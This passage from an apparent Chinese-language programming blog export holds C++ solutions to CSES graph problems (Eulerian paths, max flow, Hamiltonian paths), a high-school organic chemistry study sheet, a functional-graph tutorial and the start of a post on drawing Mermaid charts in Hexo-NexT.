scc_dfs(i));    return dp[rt] = scc_room[rt] + max_room;}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, n) cin &gt;&gt; room[i];    rep(i, 1, m){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        g[a].eb(b), rg[b].eb(a);    }    rep(i, 1, n) dfs(i);    reverse(all(ord));    for(int i : ord) if(!rvis[i]) id++, rdfs(i);    rep(i, 1, n) for(int j : g[i]) if(idx[i]!=idx[j])        scc_g[idx[i]].eb(idx[j]);    // rep(i, 1, n) err(i sp idx[i] sp room[i] sp scc_room[idx[i]]);    // rep(i, 1, id) for(int j : scc_g[i]) err(i sp j);    rep(i, 1, id) tomax(ans, scc_dfs(i));    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nMail Delivery \nMail Delivery#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, odd=1, ed=1, cnt_odd = 0;int deg[100005];vi g[100005], ans;bool vis[100005];map&lt;pii, bool&gt; evis;void dfs(int rt){    vis[rt] = 1;    while(!g[rt].empty()){        int cur = g[rt].back();        g[rt].pob();        if(evis[{rt, cur}]) continue;        evis[{rt, cur}] = 1, evis[{cur, rt}] = 1, dfs(cur);        ans.eb(rt);    }}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    si cg;    rep(i, 1, m){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        g[a].eb(b), g[b].eb(a);        deg[a]++, deg[b]++;        cg.insert(a), cg.insert(b);    }    rep(i, 1, n) if(deg[i]&amp;1) ed = odd, odd = i, cnt_odd++;    if(cnt_odd!=0) {        cout &lt;&lt; \"IMPOSSIBLE\\n\";        return 0;    }    dfs(odd);    for(int i : cg) if(!vis[i]) {        cout &lt;&lt; \"IMPOSSIBLE\\n\";        return 0;    }    reverse(all(ans));    for(int i : ans) cout &lt;&lt; i &lt;&lt; ' ';    cout &lt;&lt; ed &lt;&lt; '\\n';    return 0;}\nset \nMail Delivery - set#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, st=1, ed=1, cnt_odd = 0;si g[100005];vi ans;void dfs(int rt){    while(!g[rt].empty()){        int cur = *g[rt].begin();        g[rt].erase(g[rt].begin());        g[cur].erase(rt);        dfs(cur);    }    ans.eb(rt);}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    si cg;    rep(i, 1, m){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        g[a].insert(b), g[b].insert(a);    }    rep(i, 1, n) if(g[i].size()&amp;1) ed = st, st = i, cnt_odd++;    if(cnt_odd!=0) {        cout &lt;&lt; \"IMPOSSIBLE\\n\";        return 0;    }    dfs(st);    rep(i, 1, n) if(!g[i].empty()) {        cout &lt;&lt; \"IMPOSSIBLE\\n\";        return 0;    }    reverse(all(ans));    for(int i : ans) cout &lt;&lt; i &lt;&lt; ' ';    return 0;}\nDe Bruijn Sequence \nDe Bruijn Sequence#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n;vi g[100005], ans;void dfs(int rt){    while(!g[rt].empty()){        int cur = g[rt].back();        g[rt].pob();        dfs(cur);        ans.eb(rt&amp;1);    }}signed main() {    ios;    cin &gt;&gt; n;    rev(i, (1&lt;&lt;(n-1))-1, 0){        int nxt = (i&lt;&lt;1) &amp; ((1&lt;&lt;(n-1))-1);        g[i].eb(nxt);        g[i].eb(nxt+1);    }    dfs(0);    reverse(all(ans));    rep(i,1,n-1) cout &lt;&lt; 0;    if(n==1) cout &lt;&lt; \"01\";    else for(int i : ans) cout &lt;&lt; i;    return 0;}\nTeleporters Path \nTeleporters Path#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, deg[100005];vi g[100005], ans;void dfs(int rt){    while(!g[rt].empty()){        int cur = g[rt].back();        g[rt].pob();        dfs(cur);    }    ans.eb(rt);}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        g[a].eb(b);        deg[a]++, deg[b]++;    }    rep(i, 1+1, n-1) if(deg[i]&amp;1){        cout &lt;&lt; \"IMPOSSIBLE\\n\";        return 0;    }     if(!((deg[1]&amp;1) &amp;&amp; (deg[n]&amp;1))){        cout &lt;&lt; \"IMPOSSIBLE\\n\";        return 0;    }    dfs(1);    rep(i, 1, n) if(!g[i].empty()){        cout &lt;&lt; \"IMPOSSIBLE\\n\";        return 0;    }    reverse(all(ans));    for(int i : ans) cout &lt;&lt; i &lt;&lt; ' ';    return 0;}\nHamiltonian Flights \nHamiltonian Flights#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int mod = 1e9 + 7;int n, m;int dp[21][2000006];int g[21][21];signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m) {        int a, b;        cin &gt;&gt; a &gt;&gt; b;        g[a][b]++;    }    dp[1][1] = 1;    // int op = 0;    rep(i, 1, (1 &lt;&lt; n) - 1) {        rep(j, 1, n) {            int pos = (1 &lt;&lt; (j - 1));            if (!(i &amp; pos)) continue;            rep(k, 1, n) {                if (!g[k][j]) continue;                (dp[j][i] += dp[k][i^pos] * g[k][j]);                // op++;            }            dp[j][i] %= mod;        }        i++;  // first digit must be 1 because path start at one.    }    cout &lt;&lt; dp[n][(1 &lt;&lt; n) - 1] % mod &lt;&lt; '\\n';    return 0;}\nKnight’s Tour \nKnight's Tour#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int x, y;int dir[8][2] = {{1, 2}, {2, 1}, {1, -2}, {-2, 1}, {-1, 2}, {2, -1}, {-1, -2}, {-2, -1}};bool vis[10][10];vii ans;int out[10][10];bool dfs(int x, int y, int cnt) {    if (vis[x][y]) return 0;    if (cnt == 63) {        ans.eb(x, y);        return 1;    }    vis[x][y] = 1;    cnt++;    vector&lt;pair&lt;int, pii&gt;&gt; go;    rep(i, 0, 7) {        if (x + dir[i][0] &gt; 8 || x + dir[i][0] &lt; 1 || y + dir[i][1] &gt; 8 || y + dir[i][1] &lt; 1) continue;        int nx = x + dir[i][0], ny = y + dir[i][1], deg = 0;        rep(i, 0, 7) if (!(nx + dir[i][0] &gt; 8 || nx + dir[i][0] &lt; 1 || ny + dir[i][1] &gt; 8 || ny + dir[i][1] &lt; 1)) deg++;        go.pb({deg, {nx, ny}});    }    sort(all(go));    for (auto i : go)        if (dfs(i.S.F, i.S.S, cnt)) {            ans.eb(x,y);            return 1;        }    vis[x][y] = 0;    return 0;}signed main() {    ios;    cin &gt;&gt; x &gt;&gt; y;    dfs(x, y, 0);    reverse(all(ans));    rep(i, 1, 64) { out[ans[i - 1].F][ans[i - 1].S] = i;}    rep(i, 1, 8) {        rep(j, 1, 8) cout &lt;&lt; out[j][i] &lt;&lt; ' ';        cout &lt;&lt; '\\n';    }    return 0;}\nDownload Speed \nDownload Speed#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m;int adj[502][502];bool vis[502];bool dfs(int rt, vector&lt;int&gt; &amp;path, int threshold) {    if (vis[rt]) return false;    vis[rt] = 1;    if (rt == n) {        path.push_back(rt);        return true;    }    rep(i, 1, n) {        if (adj[rt][i] &lt; threshold) continue;        if (dfs(i, path, threshold)) {            path.push_back(rt);            return true;        }    }    return false;}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    int threshold = 0;    rep(i, 1, m) {        int a, b, c;        cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;        adj[a][b] += c;        tomax(threshold, c);    }    int ans = 0;    while (threshold &gt; 0) {        vector&lt;int&gt; path;        memset(vis, 0, sizeof(vis));        if (dfs(1, path, threshold)) {            reverse(path.begin(), path.end());            int k = path.size();            int flow = 1e9;            rep (i, 0, k-2) tomin(flow, adj[path[i]][path[i + 1]]);            ans += flow;            rep (i, 0, k-2) {                adj[path[i]][path[i + 1]] -= flow;                adj[path[i + 1]][path[i]] += flow;            }        } else threshold &gt;&gt;= 1;    }    cout &lt;&lt; ans &lt;&lt; \"\\n\";    return 0;}\nPolice Chase \nPolice Chase#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, ans;int g[502][502];bool vis[502];bool dfs(int rt){    if(vis[rt]) return 0;    if(rt == n) return 1;    vis[rt] = 1;    rep(i, 1, n){        if(g[rt][i] &amp;&amp; dfs(i)){            g[rt][i]--, g[i][rt]++;            return 1;        }    }    return 0;}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        g[a][b] = g[b][a] = 1;    }    while(dfs(1)) memset(vis, 0, sizeof(vis)), ans++;    cout &lt;&lt; ans &lt;&lt; '\\n';    rep(i, 1, n){        rep(j, 1, n){            if((vis[i] ^ vis[j]) &amp;&amp; !g[i][j] &amp;&amp; g[j][i]) cout &lt;&lt; i sp j &lt;&lt; '\\n';        }    }    return 0;}\nSchool Dance \nSchool Dance#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, k, ans;int g[1003][1003];bool vis[1003];vi go[1003];bool dfs(int rt){    if(vis[rt]) return 0;    if(rt == 1001) return 1;    vis[rt] = 1;    rep(i, 1, 1001){        if(g[rt][i] &amp;&amp; dfs(i)){            g[rt][i]--, g[i][rt]++;            return 1;        }    }    return 0;}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;    rep(i, 1, k){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        g[0][a] = g[a][b+500] = g[b+500][1001] = 1;        go[0].eb(a), go[a].eb(b+500), go[b+500].eb(1001);    }    while(dfs(0)) memset(vis, 0, sizeof(vis)), ans++;    cout &lt;&lt; ans &lt;&lt; '\\n';    while(ans--){        int a, b, s = 0;        while(s != 1001){            a=b, b=s;            for(int i : go[s])                 if(!g[s][i] &amp;&amp; g[i][s]){                    g[s][i]=1;                    s=i;                    break;                }        }        cout &lt;&lt; a sp b-500 &lt;&lt; '\\n';    }    return 0;}\nDistinct Routes \nDistinct Routes#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, ans = 0;int g[502][502];bool vis[502];vi go[502];bool dfs(int rt){    if(vis[rt]) return 0;    if(rt == n) return 1;    vis[rt] = 1;    rep(i, 1, n){        if(g[rt][i] &amp;&amp; dfs(i)) {            g[rt][i]--, g[i][rt]++;            return 1;        }    }    return 0;}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        g[a][b]++;        go[a].eb(b);    }    while(dfs(1)) memset(vis, 0, sizeof(vis)), ans++;    cout &lt;&lt; ans &lt;&lt; '\\n';    while(ans--){        vi path(1,1);        int s = 1;        while(s!=n){            for(int i : go[s])                if(!g[s][i] &amp;&amp; g[i][s]){                    g[i][s]=0;                    s=i;                    path.eb(i);                    break;                }        }        cout &lt;&lt; path.size() &lt;&lt; '\\n';        for(int i : path) cout &lt;&lt; i &lt;&lt; ' ';        cout &lt;&lt; '\\n';    }    return 0;}\n","categories":["程式題解","CSES"],"tags":["CSES"]},{"title":"高中有機化學筆記 (內附大大的分類心智圖)","url":"/high_school_organic_chemistry_note/","content":"前言 \n高中最後一次考試，想說要有個善終，也怕自己一不小心被當了，很認真讀了兩三天久久沒碰的化學，讀的時候常常想要找那種超大的表簡單說每一種烴類、官能基的性質、反應，可能就像是一些程式語法的 cheat\nsheet，能夠在學過之後，重新看到就能馬上回想起來，才不用每次寫題目都要翻講義好久，可惜沒有找到類似的東西，就只好自己做一個了。\n\n注意\n這個心智圖應該只適用於那些曾經有讀過書的人快速回想，如果還沒學過的話應該會完全看不懂，其中有一些化學式為了精簡大都只寫出最重要的部分，有疑惑處請直接翻閱教科書，若是我有寫錯我是遺漏的部分敬請指教\n\n\n心智圖 (線上檢視版)\n心智圖 (pdf)\n心智圖 (png)\n\n\n可氧化（與二鉻酸鉀、過錳酸鉀反應）\n\n\n烯、炔、烷基苯（不為三級烷基）、醇（不為三級醇）、醛、酸（僅甲酸 &amp; 乙二酸）\n\n沸點 \n\n醯胺 &gt; 羧酸 &gt; 醇 &gt; 胺 &gt; 酮、醛、酯 &gt; 醚 &gt; 烴\n\n可溶水（低碳數 &lt;=3） \n\n醇、醛、酮、酸、胺、醯胺\n\n是否飽和 \n\n以溴水檢驗，但 == 苯不會反應 ==（加催化劑（加成）或照光（取代）才會反應）\n\n水解 \n\n酯：羧酸 + 醇（鹼性環境會變成鹽類）\n醯胺：還原成酸 + 氨（酸下氨解離、鹼下酸解離）\n\n烴（碳氫） \n分類 \n\n鏈狀 or 環狀\n不飽和 or 飽和（是否有 π 鍵）\n芳香烴 or 脂肪烴（是否含苯環）\n== 脂環烴 ==：不含苯的環\n== 脂芳烴 ==：含苯外掛其他東西（如甲苯）\n\n烷 \n\n取代：鹵化（高溫、照光）、硝化（475 度）\n不溶水\n\n烯 \n\n加成：氫化（變烷）、鹵化（秀水褪色）、水合（變醇）\n氧化：紫色過錳酸鉀褪色\n不溶水\n\n炔 \n\n製備：灰石 -&gt; 氧化鈣 -&gt; 電石 (CaC2)-&gt;C2H2\n末端取代：氯化銅 + 氨水（紅色沈澱）、硝酸銀 + 氨水（白色沈澱）\n加成：氫化（變烷）、鹵化（秀水褪色）、水合（乙炔變乙醛、其他變酮）\n聚合：可導電的聚乙炔、三聚合成苯\n氧化：紫色過錳酸鉀褪色\n不溶水\n\n苯 \n\n衍伸物：萘、蔥、菲、聯苯\n製備：乙炔三聚合、正己烷環化脫氫\n取代（典型的化學反應）：鹵化、硝化（硝苯、TNT）、磺酸化、烷基化\n加成（不易反應）：在紫外光照射與三氯氣加成 -&gt; 六氯化苯 (C6H6Cl6、BHC、666)\n氧化（僅烷基苯，苯環不行）：紫色過錳酸鉀褪色 ==but==\n三級烷基（如三級 - 丁基）無法反應\n\n有機鹵化物 R - X \n\n難溶水\n== 密度 &gt; 1==-&gt; 會在水下層\n與強鹼反應：== 水中得醇，醇中得烯 ==\n\n羥基 -OH （醇、酚） \n醇 \n\n溶於水\n通式：\\(C_nH_{2n+2}O\\)\n與鈉、鉀金屬反應：H 被還原成氫氣（乙醇 -&gt; 乙醛鈉 + 氫氣）\n鹵化：\\(R-OH+HX\\rightarrow R-X +\nH_2O\\)\n脫水：\n\n170~180 度：形成烯（\\(C_2H_5OH\\rightarrow\nC_2H_4\\)）\n130~140 度：形成醚（\\(C_2H_5OH\\rightarrow\nC_2H_5OC_2H_5\\)）\n\n氧化：\n\n一級（二鉻酸鉀一步一步、過錳酸鉀直接變酸）：醇 \\(\\rightarrow\\) 醛 \\(\\rightarrow\\) 酸（如果是甲酸還可以繼續氧化變 \\(CO_2\\)）\n二級：醇 \\(\\rightarrow\\) 酮\n三級：不能氧化\n\n\n酚 \n\n微溶水\n弱酸（可溶於強鹼，不溶於弱鹼（碳酸氫鈉 aq））\n製備：苯 \\(\\rightarrow\\) 被氯魯化 \\(\\rightarrow\\) 氫氧化鈉 aq、高溫高壓 \\(\\rightarrow\\) 酸性下 \\(\\rightarrow\\) 完成\n與鈉、鉀金屬反應：H 被還原成氫氣\n製作成阿斯匹靈（見酯）\n檢驗：會與 \\(Fe^{3+}\\) 離子形成紫色錯合物 \\(\\rightarrow\\) 使用 \\(FeCl_3\\) 檢驗酚\n\n醚基 R - O-R’ \n\n通式：\\(C_nH_{2n+2}O\\)\n製備：兩個醇加起來脫水（130~140 度）\n難溶於水\n沸點低\n化性：安定，不易進行反應\n\n常見 \n\n(二) 甲 (基) 醚 \\(H_3C-O-CH_3\\)\n(二) 乙 (基) 醚 \\(H_5C_2-O-C_2H_5\\)\n甲 (基) 乙 (基) 醚 \\(H_3C-O-C_2H_5\\)\n\n羰基 C = O （醛、酮） \n\n通式：\\(C_nH_{2n}O\\)\n溶於水\n氧化：見醇\n醛的檢測：多侖、婓林、本式液（可與甲酸反應）\n\n羧基 O = C - OH （羧酸） \n\n通式：\\(C_nH_{2n}O_2\\)\n製備：醇 \\(\\rightarrow\\) 醛 \\(\\rightarrow\\) 酸\n溶於水\n與活性金屬反應（Zn、Fe 即可）：解離出 \\(H^+\\) 生氫氣\n酸鹼中和\n氧化還原：僅甲酸 &amp; 乙二酸可氧化成 \\(CO_2\\)\n脫水：形成酸酐\n酯化：醇 + 酸 = 酯 + 水\n醯胺化：胺 + 酸 = 醯胺 + 水\n\n酯基 O = C - OR \n\n通式：\\(C_nH_{2n}O_2\\)\n不溶水\n水解：羧酸 + 醇（鹼性環境會變成鹽類）\n皂化：酯 + 鹼 -&gt; 醇 + 鹽類（肥皂）\n柳酸 (s)+ 乙酐 (l)-&gt; 阿斯匹靈 (s)\n\n實驗步驟\n\n因柳酸自己的羧基和羥基會自聚合生成，所以需分離不用的副產物以及反應物，純化阿斯匹靈\n以過量乙酐確保最後不會有多的柳酸\n取反應後固態的物質（阿斯匹靈、柳酸副產物）\n放入鹼性環境，取液體（阿斯匹靈為酸能夠化學溶解，副產物析出）\n放入酸性環境，取攜出物質（阿斯匹靈遇酸析出）\n\n檢驗純度（是否含柳酸）：放入 \\(FeCl_3(aq)\\) 是否為紫色（柳酸含有酚結構）\n\n\n胺 N \n\n製備\n\n烷先鹵化，鹵烷與氨做取代反應成為一級胺（\\(C_2H_6+Cl_2\\rightarrow\nC_2H_5Cl+HCl\\)、\\(C_2H_5Cl+NH_3\\rightarrow C_2H_5NH_2\\)\n）\n鹵烷與一級胺做取代反應成為二級胺（\\(C_2H_5Cl+C_2H_5NH_2\\rightarrow\n(C_2H_5)_2NH+HCl\\) ）\n苯 \\(\\rightarrow\\)(硝化) 硝基苯 (\\(NO_2\\) 接苯）\\(\\rightarrow\\)(還原 \\(H_2/Pt\\)）苯胺\n\n溶於水\n會臭\n弱鹼性（因此酸化形成銨鹽）\n與酯、醯氯、酸酐反應成醯胺（取代反應）：保留醯基和胺基\n\n醯胺 O = C - N \n\n製備：胺或氨與酯、醯氯、酸酐反應（取代反應）保留醯基和胺基\n溶於水\n大部分為固體，除 N,N- 二甲基甲醯胺（常見溶劑）\n中性，無法形成銨鹽\n水解：還原成酸 + 氨（酸下氨解離、鹼下酸解離）\n\n","categories":["化學"],"tags":["高中","有機化學"]},{"title":"Functional Graph 簡介與相關題型說明","url":"/functional_graph/","content":"前言 \n為什麼叫做\nFunctional，顧名思義，他是一個多對一的圖（各個點出度皆為 1），如下表所示：\n\n\n\nFrom\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n\ngo\n3\n4\n1\n6\n9\n3\n2\n1\n6\n8\n\n\n\nflowchart LR\n1 --&gt; 3\n2 --&gt; 4\n3 --&gt; 1\n4 --&gt; 6\n5 --&gt; 9\n6 --&gt; 3\n7 --&gt; 2\n8 --&gt; 1\n9 --&gt; 6\n10 --&gt;8\n這邊就整理了一些常見的題型，以及解題的方法。\n\n特性 \n各個聯通塊中必定恰有一個環 (鴿籠原理)，且從該張圖的任意一點都必定能夠拜訪到該環\n常見問題 \n找從當前點往後 k 點是什麼 \n倍增法\n以 \\(ch_{ij}\\) 表示 \\(i\\) 往後 \\(2^j\\) 是什麼， \\(ch_{i0}\\) 就代表 \\(i\\)\n點的下一個點，詢問時使用類似位元枚舉的方式檢查\nint ch[200005][31]; //[i][j] -&gt; 2^j th child of ivoid build(){    rep(i, 1, 30)        rep(j, 1, n)            ch[j][i] = ch[ch[j][i-1]][i-1];}int query(int x, int k){    for(int i = 0;k!=0; k&gt;&gt;=1, i++)        if(k &amp; 1)            x = ch[x][i];    return x;}\n是否聯通 \nDSU\n就很基礎的操作，如果兩點相鄰就合併，然後最後檢查老大是不是一樣的\n是否在環內、環內第幾個、環有多大\n\n對所有點 dfs\n當該圖還從未被遍歷過時，第一次遇到以拜訪過的點，就是遇到環了（若從未拜訪過，第一次拜訪該聯通塊必定會遇到環，否則必定不會遇到環），然後開始往前回溯直到再次遇到該點就停止，這一路上的各個皆為環中的一員，並在回溯的過程中，從該節點的前一點編號加一，得到該點在環中排地幾，最後回溯終點的排名即為環的大小（可以用該點的老大作為該環的索引會比較方便）\nint dfs(int rt) {    if (vis[rt]) return rt;    vis[rt] = 1;    int flag = dfs(go[rt]);    if (!sizeC[find_boss(rt)]) {        inC[rt] = 1;        idxC[rt] = idxC[go[rt]] + 1;        if (flag == rt) sizeC[find_boss(rt)] = idxC[rt];    }    return flag;}\n距離環有多遠 \n從在環上的各點反向 dfs不在環上的邊\nvoid dfs2(int rt, int id) {    idxA[rt] = id;    for (int i : rgo[rt])        if (!inC[i]) dfs2(i, id + 1);}\n例題 \n\nPlanets Queries\nI\nPlanets\nCycles\nPlanets Queries\nII\n\n註：如果要寫的話這個順序應該會比較合適，因為 Planets Queries\nII 應該要當作 Planets Cycles 的延伸才對 (Planets Queries\nII 比較難)，這樣才會有循序漸進的感覺\n\n","categories":["演算法","圖論"],"tags":["演算法"]},{"title":"Hexo-NexT 畫出漂亮的圖表 (Mermaid) (含明暗模式切換)","url":"/NexT-chart/","content":"前言 \n常常想要畫一些圖表但總是要去用其他的工具畫完然後再把圖片貼上，這樣很麻煩，所以這邊就來介紹一下怎麼在 NexT 中畫出漂亮的圖表\n\n注意\n用 mermaid 可以畫出各種你想表達複雜的圖，但可能不會是你想像中的樣子\n例如說你想畫出這種圖：\n\n但你會畫出這種：\nflowchart LR\n    a--&gt;b--&gt;c\n    d--&gt;e--&gt;f\n    c--&gt;d\n或是這樣：\nflowchart LR\n    subgraph x[\" \"]\n        direction TB\n        subgraph Z[\" \"]\n        direction LR\n            A --&gt; B\n            B --&gt; C\n        end\n\n        subgraph ZA[\" \"]\n        direction RL\n            D--&gt;E\n            E--&gt;F\n        end\n\n        Z ~~~ ZA\n        Z ~~~ ZA\n        Z ~~~ ZA\n        Z ~~~ ZA\n        Z ~~~ ZA\n        Z ~~~ ZA\n        Z ~~~ ZA\n        Z ~~~ ZA\n        Z ~~~ ZA\n        Z ~~~ ZA\n    end\n        Z --&gt; ZA\nMermaid 的重點是把各種關係自動生成圖表，\n能畫出哪些圖表 \n\nFlowchart（流程圖）\nPie chart diagrams 